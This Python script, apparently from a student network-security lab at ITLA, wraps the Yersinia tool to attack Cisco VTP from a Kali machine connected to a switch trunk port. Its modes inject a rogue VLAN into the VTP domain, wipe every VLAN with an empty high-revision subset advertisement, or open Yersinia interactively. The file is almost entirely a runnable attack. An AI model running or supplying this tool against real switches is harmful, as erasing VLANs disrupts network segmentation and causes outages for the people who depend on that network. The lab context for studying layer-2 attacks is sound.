#!/usr/bin/env python3
# VTP ATTACK CON YERSINIA | Matricula: 2023-0316 | ITLA
# Topologia: Kali eth0 <-> SW-CORE Gig0/1 (trunk)
#
# Instalar yersinia si falta:
#   sudo apt install yersinia
#
# Uso:
#   sudo python3 vtp_attack_yersinia.py -a agregar
#   sudo python3 vtp_attack_yersinia.py -a borrar
#   sudo python3 vtp_attack_yersinia.py -a interactivo

import subprocess, argparse, sys, os, time

INTERFAZ = "eth0"

def banner():
    print("""
+--------------------------------------------------+
|  VTP ATTACK (YERSINIA) | Matricula: 2023-0316   |
|  ITLA - Laboratorio de Seguridad en Redes        |
|  Kali eth0 -> SW-CORE Gig0/1 (trunk)            |
+--------------------------------------------------+
""")

def verificar_yersinia():
    r = subprocess.run(["which", "yersinia"], capture_output=True, text=True)
    if r.returncode != 0:
        print("[!] Yersinia no encontrado. Instalar con:")
        print("    sudo apt install yersinia")
        sys.exit(1)
    print("[+] Yersinia encontrado:", r.stdout.strip())

def verificar_interfaz(iface):
    r = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
    if r.returncode != 0:
        print(f"[!] Interfaz {iface} no encontrada.")
        sys.exit(1)
    if "UP" not in r.stdout:
        print(f"[*] Activando {iface}...")
        subprocess.run(["ip", "link", "set", iface, "up"])
        time.sleep(1)
    print(f"[+] Interfaz {iface} activa")

def ataque_agregar(iface):
    """
    Yersinia VTP attack 1 = Adding a VLAN
    Envia VTP Summary + Subset con revision alta
    para inyectar una VLAN nueva en el dominio.
    """
    print(f"\n[ATAQUE 1] Agregando VLAN via Yersinia en {iface}")
    print("  Yersinia envia VTP Summary + Subset con revision alta\n")
    cmd = ["yersinia", "vtp", "-attack", "1", "-interface", iface]
    print(f"[*] Ejecutando: {chr(32).join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    if r.stdout: print(r.stdout)
    if r.stderr: print(r.stderr)
    print("[+] Ataque completado.")
    print("    Verificar: show vlan brief | show vtp status")

def ataque_borrar(iface):
    """
    Yersinia VTP attack 2 = Deleting all VLANs
    Envia VTP Subset VACIO con revision alta
    para eliminar todas las VLANs del dominio.
    """
    print(f"\n[ATAQUE 2] Borrando VLANs via Yersinia en {iface}")
    print("  Yersinia envia VTP Subset VACIO con revision alta\n")
    cmd = ["yersinia", "vtp", "-attack", "2", "-interface", iface]
    print(f"[*] Ejecutando: {chr(32).join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    if r.stdout: print(r.stdout)
    if r.stderr: print(r.stderr)
    print("[+] Ataque completado.")
    print("    Verificar: show vlan brief (solo debe quedar VLAN 1)")

def ataque_interactivo(iface):
    """
    Abre Yersinia en modo ncurses para control manual.
    Teclas dentro de Yersinia:
      g = seleccionar protocolo -> elegir VTP
      x = ver ataques disponibles
      q = salir
    """
    print(f"\n[INTERACTIVO] Abriendo Yersinia en {iface}")
    print("  g = protocolo | x = ataques | q = salir\n")
    subprocess.run(["yersinia", "-I", "-interface", iface])

def main():
    banner()
    p = argparse.ArgumentParser(description="VTP Yersinia | 2023-0316 | ITLA")
    p.add_argument("-i", "--interfaz", default=INTERFAZ)
    p.add_argument("-a", "--accion",
                   choices=["agregar", "borrar", "interactivo"],
                   required=True)
    a = p.parse_args()
    print(f"Interfaz : {a.interfaz}")
    print(f"Accion   : {a.accion}\n")
    verificar_yersinia()
    verificar_interfaz(a.interfaz)
    if a.accion == "agregar":
        ataque_agregar(a.interfaz)
    elif a.accion == "borrar":
        ataque_borrar(a.interfaz)
    elif a.accion == "interactivo":
        ataque_interactivo(a.interfaz)

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[!] Ejecutar con sudo")
    main()
